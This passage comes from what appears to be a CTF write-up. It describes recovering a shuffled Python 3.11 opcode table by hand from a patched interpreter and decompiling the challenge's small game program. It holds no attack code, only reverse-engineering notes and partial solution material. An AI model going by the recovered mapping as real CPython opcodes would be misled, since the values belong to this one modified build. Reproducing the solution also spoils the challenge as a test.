&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The patch file also modifies the &lt;code&gt;ceval.c&lt;/code&gt; file, but I don&amp;rsquo;t understand what this does.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;diff --git a/Python/ceval.c b/Python/ceval.c
index 1d2c6432d0..e275158d9d 100644
--- a/Python/ceval.c
+++ b/Python/ceval.c
@@ -1344,6 +1344,8 @@ eval_frame_handle_pending(PyThreadState *tstate)
 #define OR_DTRACE_LINE
 #endif
 
+#define USE_COMPUTED_GOTOS 0
+
 #ifdef HAVE_COMPUTED_GOTOS
     #ifndef USE_COMPUTED_GOTOS
     #define USE_COMPUTED_GOTOS 1
@@ -1705,6 +1707,7 @@ _PyEval_EvalFrameDefault(PyThreadState *tstate, _PyInterpreterFrame *frame, int
 #if USE_COMPUTED_GOTOS
 /* Import the static jump table */
 #include &amp;quot;opcode_targets.h&amp;quot;
+    asdasdasd, break the compilation...
 #endif
 
 #ifdef Py_STATS
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;opcode&#34;&gt;Opcode&lt;/h2&gt;
&lt;p&gt;Based on the information in the patch file, we came up with two ideas. One is to solve it by cracking the random number generator, and the other is to recover all opcodes manually.&lt;/p&gt;
&lt;h3 id=&#34;cracking-the-random-number-generator&#34;&gt;Cracking the random number generator&lt;/h3&gt;
&lt;p&gt;Since randon.shuffle is based on mt19937, cracking this requires providing 624 32bit numbers which is impossible. So we spent a lot of time on cracking the seed of the random number generator. For example, I found the file generation date of the patch file very suspicious, so I tried to use that time as random seed. We also used the sleeping hours to run the explosion program. Until we find:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;random.seed(a=None, version=2)
    Initialize the random number generator.
    If a is omitted or None, the current system time is used. If randomness sources are provided by the operating system, they are used instead of the system time (see the os.urandom() function for details on availability).
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We do not think there is any way to guess os.urandom(), so we focused on the second method.&lt;/p&gt;
&lt;h3 id=&#34;recover-opcodes-by-hand&#34;&gt;Recover opcodes by hand&lt;/h3&gt;
&lt;p&gt;It&amp;rsquo;s difficult to disasm python 3.11 .pyc files, for the marshal and opcodes changes a lot. The newist tools I know is pycdc which still support python 3.10 only.&lt;/p&gt;
&lt;p&gt;I started with some easy functions. For example, it is obvious that &lt;code&gt;__main__&lt;/code&gt; start with &lt;code&gt;import sys&lt;/code&gt; and followd with functions defination.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0    RESUME        0
2    LOAD_CONST    0
4    LOAD_CONST    1
6    IMPORT_NAME   0 (sys)
8    STORE_NAME    0             

26   LOAD_CONST    2
28   MAKE_FUNCTION 0
30   STORE_NAME    3 (ks)

68   LOAD_CONST    1
70   RETURN_VALUE  0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore we got:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;code&lt;/th&gt;
&lt;th&gt;op&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x61&lt;/td&gt;
&lt;td&gt;RESUME&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x60&lt;/td&gt;
&lt;td&gt;LOAD_CONST&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xab&lt;/td&gt;
&lt;td&gt;IMPORT_NAME&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x96&lt;/td&gt;
&lt;td&gt;STORE_NAME&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x31&lt;/td&gt;
&lt;td&gt;RETURN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x63&lt;/td&gt;
&lt;td&gt;MAKE_FUNCTION&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;I also find there were lots of &lt;code&gt;20 00&lt;/code&gt; in .pyc file. Which is &lt;code&gt;CACHE&lt;/code&gt;, and we can ignore it.&lt;/p&gt;
&lt;p&gt;Since there were bugs in &lt;code&gt;dis&lt;/code&gt; module after I change the opcode.py, I gave it up. But we can still use &lt;code&gt;dis.show_code()&lt;/code&gt; to unserialize marshal.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; marshal&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; dis
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x.pyc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; fd&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seek(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; marshal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(fd)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show_code(a)
Name:              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;module&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
Filename:          &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;google&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;xxxxxxxxx&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;yyyy&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;zzzzzzzzzzzzzzzz&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;xxxxxxxxxxx&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
Argument count:    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Positional&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;only arguments: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Kw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;only arguments: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Number of locals:  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Stack size:        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
Flags:             &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;
Constants:
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object ks at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x101419470&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object cry at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1016003f0&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object fail at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x101553000&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object game1 at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12c704920&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object game2 at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12c704cc0&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object game3 at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12c7051f0&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object main at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12c704f20&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
Names:
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: sys
   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: random
   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: time
   &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: ks
   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: cry
   &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: fail
   &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: game1
   &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;: game2
   &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;: game3
   &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;: main
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show_code(a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_consts[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
Name:              ks
Filename:          &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;google&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;xxxxxxxxx&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;yyyy&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;zzzzzzzzzzzzzzzz&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;xxxxxxxxxxx&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
Argument count:    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
Positional&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;only arguments: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Kw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;only arguments: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
Number of locals:  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
Stack size:        &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
Flags:             OPTIMIZED, NEWLOCALS, GENERATOR
Constants:
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
Names:
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: random
   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: seed
   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: randint
Variable names:
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: seed
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Start with the short function will be easier. For example, it is easy to recognize &lt;code&gt;BINARY_OP&lt;/code&gt; and &lt;code&gt;LOAD_FAST&lt;/code&gt; in function &lt;code&gt;w()&lt;/code&gt; which defined in function &lt;code&gt;game1()&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Name:              w
Filename:          /usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py
Argument count:    3
Positional-only arguments: 0
Kw-only arguments: 0
Number of locals:  3
Stack size:        3
Flags:             OPTIMIZED, NEWLOCALS, NESTED
Constants:
   0: None
   1: 10
   2: 1
Variable names:
   0: m
   1: i
   2: j

0x7a2 0x7c0
0    RESUME       0
2    LOAD_FAST    0 (m)
4    LOAD_FAST    1 (i)
6    LOAD_CONST   1 (10)
8    BINARY_OP    5 (*)
12   LOAD_FAST    2 (j)
14   BINARY_OP    0 (+)
18   BINARY_OP    9 (&amp;gt;&amp;gt;)
22   LOAD_CONST   2 (1)
24   BINARY_OP    1 (&amp;amp;)
28   RETURN_VALUE 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Some important information of &lt;code&gt;LOAD_*&lt;/code&gt; from docs:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LOAD_CONST(&lt;em&gt;consti&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;Pushes &lt;code&gt;co_consts[consti]&lt;/code&gt; onto the stack.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;LOAD_NAME(&lt;em&gt;namei&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LOAD_NAME [namei]&lt;/code&gt; Pushes &lt;code&gt;co_names[x // 2]&lt;/code&gt; onto the stack.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;LOAD_FAST(&lt;em&gt;var_num&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;Pushes a reference to the local &lt;code&gt;co_varnames[var_num]&lt;/code&gt; onto the stack.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;LOAD_METHOD(&lt;em&gt;namei&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LOAD_METHOD x&lt;/code&gt; Pushes &lt;code&gt;co_names[x]&lt;/code&gt; onto the stack.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;By recognize &lt;code&gt;print ()&lt;/code&gt; in &lt;code&gt;main()&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0    RESUME        0
2    PUSH_NULL
4    LOAD_NAME     0 (print)
16   LOAD_CONST    1 (&#39;Pass 3 tests to prove your worth!&#39;)
18   PRECALL       1
22   CALL          1
32   POP_TOP       0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We got:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;code&lt;/th&gt;
&lt;th&gt;op&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xB9&lt;/td&gt;
&lt;td&gt;LOAD_NAME&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xBF&lt;/td&gt;
&lt;td&gt;PRECALL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x8E&lt;/td&gt;
&lt;td&gt;CALL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x01&lt;/td&gt;
&lt;td&gt;POP_TOP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x50&lt;/td&gt;
&lt;td&gt;PUSH_NULL&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;After recover all functions, we got:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;code&lt;/th&gt;
&lt;th&gt;op&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x7b&lt;/td&gt;
&lt;td&gt;JUMP_BACKWARD&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xb6&lt;/td&gt;
&lt;td&gt;FOR_ITER&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x1f&lt;/td&gt;
&lt;td&gt;GET_ITER&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x8d&lt;/td&gt;
&lt;td&gt;STORE_FAST&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x8f&lt;/td&gt;
&lt;td&gt;UNPACK_SEQUENCE&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x62&lt;/td&gt;
&lt;td&gt;LOAD_FAST&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xc6&lt;/td&gt;
&lt;td&gt;BINARY_OP&lt;/td&gt;
&lt;td&gt;(+, &amp;amp;, //, &amp;laquo;, @, *, %, |, **, &amp;raquo;, -, /, ^, +=)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x74&lt;/td&gt;
&lt;td&gt;BUILD_LIST&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x68&lt;/td&gt;
&lt;td&gt;COMPARE_OP&lt;/td&gt;
&lt;td&gt;(&#39;&amp;lt;&#39;, &amp;lsquo;&amp;lt;=&amp;rsquo;, &amp;lsquo;==&amp;rsquo;, &amp;lsquo;!=&amp;rsquo;, &amp;lsquo;&amp;gt;&amp;rsquo;, &amp;lsquo;&amp;gt;=&#39;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xba&lt;/td&gt;
&lt;td&gt;POP_JUMP_FORWARD_IF_FALSE&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x5d&lt;/td&gt;
&lt;td&gt;JUMP_FORWARD&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x92&lt;/td&gt;
&lt;td&gt;LOAD_METHOD&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x88&lt;/td&gt;
&lt;td&gt;BUILD_SLICE&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xaf&lt;/td&gt;
&lt;td&gt;POP_JUMP_BACKWARD_IF_TRUE&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x82&lt;/td&gt;
&lt;td&gt;BUILD_TUPLE&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x75&lt;/td&gt;
&lt;td&gt;CONTAINS_OP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xb1&lt;/td&gt;
&lt;td&gt;BUILD_CONST_KEY_MAP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;There&amp;rsquo;s still some opcode I didn&amp;rsquo;t recognize, but that doesn&amp;rsquo;t affect our decompilation anymore.&lt;/p&gt;
&lt;p&gt;The decompilation result (by hand) was:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ks&lt;/span&gt;(seed):
    random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seed(seed)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; (random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cry&lt;/span&gt;(s, seed):
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x, y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(ks(seed), s):
        r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(x &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; y)
    bytes(r)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fail&lt;/span&gt;(s):
    print (s)
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Thanks for playing!&amp;#34;&lt;/span&gt;)
    sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;game1&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;(m, i, j):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (m &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
